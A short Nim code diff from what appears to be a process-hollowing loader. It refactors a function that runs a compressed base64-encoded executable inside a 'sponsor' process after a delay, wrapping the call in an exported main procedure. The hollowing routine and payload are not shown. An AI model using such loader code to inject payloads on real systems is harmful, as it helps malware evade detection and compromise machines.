@@ -14,7 +14,7 @@ when defined(hollownimline):
     import hollowNimlineWhispers
 
 
-proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), sleepSeconds: int = 0): bool =
+proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), sleepSeconds: int = 0): bool =
 
     # Sleep at execution
     sleep(sleepSeconds * 1000)
@@ -34,9 +34,10 @@ proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(),
 
 
 # Execute
-discard execute(
-    compressedBase64PE = compressedBase64PE, 
-    sponsorCmd = sponsorPath & sponsorParams,
-    sleepSeconds = sleepSeconds
-)
+proc main*() =
+    discard execute(
+        compressedBase64PE = compressedBase64PE, 
+        sponsorCmd = sponsorPath & sponsorParams,
+        sleepSeconds = sleepSeconds
+    )
 
